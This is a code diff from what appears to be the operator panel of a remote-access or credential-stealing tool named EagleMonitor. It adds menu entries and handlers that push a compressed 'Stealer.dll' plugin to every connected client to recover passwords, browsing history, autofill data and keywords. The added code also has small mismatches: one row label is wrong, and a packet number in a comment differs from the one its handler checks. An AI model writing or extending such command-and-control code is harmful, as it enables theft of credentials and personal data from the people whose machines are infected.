@@ -25,6 +25,9 @@ namespace EagleMonitor.Forms
         {
             packetGuna2ComboBox.Items.Add(PacketType.RECOVERY_PASSWORDS);
             packetGuna2ComboBox.Items.Add(PacketType.RECOVERY_HISTORY);
+            packetGuna2ComboBox.Items.Add(PacketType.RECOVERY_AUTOFILL);
+            packetGuna2ComboBox.Items.Add(PacketType.RECOVERY_KEYWORDS);
+            packetGuna2ComboBox.Items.Add(PacketType.RECOVERY_ALL);
         }
 
         private void addPacketGuna2Button_Click(object sender, EventArgs e)
@@ -45,11 +48,25 @@ namespace EagleMonitor.Forms
                         row.Cells["Column1"].Value = ((byte)PacketType.RECOVERY_HISTORY);
                         row.Cells["Column2"].Value = "RECOVERY_HISTORY";
                         break;
+
+                    case "RECOVERY_KEYWORDS":
+                        row.Cells["Column1"].Value = ((byte)PacketType.RECOVERY_KEYWORDS);//54
+                        row.Cells["Column2"].Value = "RECOVERY_KEYWORDS";
+                        break;
+
+                    case "RECOVERY_AUTOFILL":
+                        row.Cells["Column1"].Value = ((byte)PacketType.RECOVERY_AUTOFILL);//53
+                        row.Cells["Column2"].Value = "RECOVERY_AUTOFILL";
+                        break;
+
+                    case "RECOVERY_ALL":
+                        row.Cells["Column1"].Value = ((byte)PacketType.RECOVERY_ALL);//65
+                        row.Cells["Column2"].Value = "RECOVERY_AUTOFILL";
+                        break;
                 }
-
             }));
-
         }
+
         private void dataGridView1_MouseUp(object sender, MouseEventArgs e)
         {
             if (e.Button == MouseButtons.Left)
@@ -72,27 +89,71 @@ namespace EagleMonitor.Forms
                 switch (packetNum) 
                 {
                     case "3":
+                        PasswordsPacket passwordsPacket = new PasswordsPacket
+                        {
+                            plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
+                        };
+
                         foreach (KeyValuePair<string, ClientHandler> client in ClientHandler.ClientHandlersList) 
                         {
-                            PasswordsPacket passwordsPacket = new PasswordsPacket
-                            {
-                                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
-                            };
                             client.Value.SendPacket(passwordsPacket);
                         }
+
                         break;
 
                     case "4":
+                        HistoryPacket historyPacket = new HistoryPacket
+                        {
+                            plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
+                        };
+
                         foreach (KeyValuePair<string, ClientHandler> client in ClientHandler.ClientHandlersList)
                         {
-                            HistoryPacket historyPacket = new HistoryPacket
-                            {
-                                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
-                            };
                             client.Value.SendPacket(historyPacket);
                         }
+
                         break;
 
+                    case "54":
+                        KeywordsPacket keywordsPacket = new KeywordsPacket
+                        {
+                            plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
+                        };
+
+                        foreach (KeyValuePair<string, ClientHandler> client in ClientHandler.ClientHandlersList)
+                        {
+                            client.Value.SendPacket(keywordsPacket);
+                        }
+
+                        break;
+
+                    case "53":
+
+                        AutofillPacket autofillPacket = new AutofillPacket
+                        {
+                            plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
+                        };
+
+                        foreach (KeyValuePair<string, ClientHandler> client in ClientHandler.ClientHandlersList)
+                        {
+                            client.Value.SendPacket(autofillPacket);
+                        }
+
+                        break;
+
+                    case "66":
+
+                        RecoveryPacket recoveryPacket = new RecoveryPacket
+                        {
+                            plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
+                        };
+
+                        foreach (KeyValuePair<string, ClientHandler> client in ClientHandler.ClientHandlersList)
+                        {
+                            client.Value.SendPacket(recoveryPacket);
+                        }
+
+                        break;
                 }
             }
         }
